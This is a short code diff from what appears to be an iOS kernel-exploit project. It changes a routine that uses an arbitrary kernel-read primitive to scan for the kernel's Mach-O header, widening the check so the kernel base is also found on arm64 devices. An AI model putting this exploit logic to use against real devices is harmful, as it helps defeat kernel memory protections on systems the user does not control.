@@ -131,8 +131,10 @@ void kread_sem_open_find_proc(struct kfd* kfd)
             uint64_t val = 0;
             kread((u64)kfd, kerntask_tte_page, &val, sizeof(val));
             if(val == 0x100000cfeedfacf) {
-                kread((u64)kfd, kerntask_tte_page + 0x18, &val, sizeof(val)); //check if mach_header_64->flags, mach_header_64->reserved are all 0
-                if(val == 0) {
+                kread((u64)kfd, kerntask_tte_page + 0x18, &val, sizeof(val)); 
+                //arm64e: check if mach_header_64->flags, mach_header_64->reserved are all 0
+                //arm64: check if mach_header_64->flags == 0x200001 and mach_header_64->reserved == 0;  0x200001
+                if(val == 0 || val == 0x200001) {
                     kbase = kerntask_tte_page;
                     break;
                 }
